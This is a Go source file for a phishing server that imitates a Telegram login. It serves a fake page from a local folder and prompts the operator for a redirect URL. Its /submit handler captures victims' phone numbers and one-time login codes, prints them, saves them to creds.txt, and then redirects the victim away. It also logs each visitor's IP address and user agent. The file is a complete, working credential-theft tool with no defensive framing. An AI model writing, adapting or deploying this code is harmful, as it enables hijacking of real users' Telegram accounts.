package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"
)

const (
	ColorRed    = "\033[31m"
	ColorGreen  = "\033[32m"
	ColorYellow = "\033[33m"
	ColorReset  = "\033[0m"
)

func main() {
	fmt.Println(`
	` + ColorRed + `                                                                                
	@@@@@@@  @@@  @@@ @@@  @@@@@@ @@@  @@@ @@@@@@@@ @@@@@@@       @@@@@@@   @@@@@@  
	@@!  @@@ @@!  @@@ @@! !@@     @@!  @@@ @@!      @@!  @@@     !@@       @@!  @@@ 
	@!@@!@!  @!@!@!@! !!@  !@@!!  @!@!@!@! @!!!:!   @!@!!@!      !@! @!@!@ @!@  !@! 
	!!:      !!:  !!! !!:     !:! !!:  !!! !!:      !!: :!!  !:! :!!   !!: !!:  !!! 
	 :        :   : : :   ::.: :   :   : : : :: ::   :   : : :::  :: :: :   : :. :  
																					
	` + ColorRed)

	var option string
	fmt.Print("Choose options (e.g., Telegram): ")
	fmt.Scanln(&option)

	if option != "Telegram" {
		log.Fatal(ColorRed + "Only Telegram option is supported for now." + ColorReset)
	}

	var enableOTP string
	fmt.Print("Do you want to enable OTP? (yes/no): ")
	fmt.Scanln(&enableOTP)

	if strings.ToLower(enableOTP) != "yes" {
		log.Fatal(ColorRed + "OTP is required for now." + ColorReset)
	}

	var redirectURL string
	fmt.Print("Enter redirect URL: ")
	reader := bufio.NewReader(os.Stdin)
	redirectURL, _ = reader.ReadString('\n')
	redirectURL = strings.TrimSpace(redirectURL)

	http.Handle("/", logRequest(http.FileServer(http.Dir("./sites/telegram-groups"))))

	http.HandleFunc("/submit", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}

		if err := r.ParseForm(); err != nil {
			http.Error(w, "Failed to parse form data", http.StatusInternalServerError)
			return
		}

		phoneNumber := r.Form.Get("phonenumber")
		otp := r.Form.Get("otp")

		log.Printf(ColorGreen+"Received Phone Number: %s, OTP: %s"+ColorReset, phoneNumber, otp)

		if err := writeToCredsFile(phoneNumber, otp); err != nil {
			http.Error(w, "Failed to write to creds.txt", http.StatusInternalServerError)
			return
		}

		http.Redirect(w, r, redirectURL, http.StatusSeeOther)
	})

	go func() {
		if err := http.ListenAndServe(":8080", nil); err != nil {
			log.Fatalf(ColorRed+"Failed to start HTTP server: %v"+ColorReset, err)
		}
	}()

	quit := make(chan os.Signal, 1)
	signal.Notify(quit, syscall.SIGINT, syscall.SIGTERM)
	<-quit
	fmt.Println(ColorYellow + "Server terminated." + ColorReset)
}

func writeToCredsFile(phoneNumber, otp string) error {
	file, err := os.OpenFile("creds.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	if _, err := fmt.Fprintf(file, "Phone Number: %s, OTP: %s\n", phoneNumber, otp); err != nil {
		return err
	}

	return nil
}

func logRequest(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		start := time.Now()

		next.ServeHTTP(w, r)

		log.Printf(ColorYellow + "Request Received:" + ColorReset)
		log.Printf("    Client: %s", r.RemoteAddr)
		log.Printf("    IP: %s", getIPAddress(r))
		log.Printf("    URL: %s", r.URL.String())
		log.Printf("    Method: %s", r.Method)
		log.Printf("    User-Agent: %s", r.UserAgent())
		log.Printf("    Duration: %s", time.Since(start))
	})
}

func getIPAddress(r *http.Request) string {
	ip := r.Header.Get("X-Forwarded-For")
	if ip != "" {
		return ip
	}

	if host, _, err := net.SplitHostPort(r.RemoteAddr); err == nil {
		return host
	}
	return "unknown"
}
